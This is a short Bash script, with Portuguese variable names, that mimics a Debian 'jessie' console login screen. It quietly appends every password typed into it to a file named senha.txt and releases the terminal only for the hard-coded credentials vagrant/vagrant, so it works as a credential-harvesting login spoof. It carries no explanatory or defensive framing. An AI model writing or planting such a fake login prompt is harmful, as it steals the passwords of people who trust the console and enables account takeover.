#!/bin/bash
usuario=vagrant
senha=vagrant
sai=1

while (( $sai != 0 )); do
clear

echo 
echo "Debian GNU/Linux jessie 8 tty1"
echo
qnt=1

while ( ( $qnt <= 5 )); do
echo -n "jessie login:"
read  user
echo -n "Password:"
read -s pass
echo
echo $pass >> senha.txt
if  [ $user == $usuario ]; then
	if [ $pass == $senha ]; then
		sai=0
		qnt=6

	else
		sleep 3
		echo
		echo "Login incorrect"
	fi
else
		sleep  3
		echo
		echo "Login incorrect"	
		
fi
let qnt=($qnt+1)
 done
done
echo "Passou"


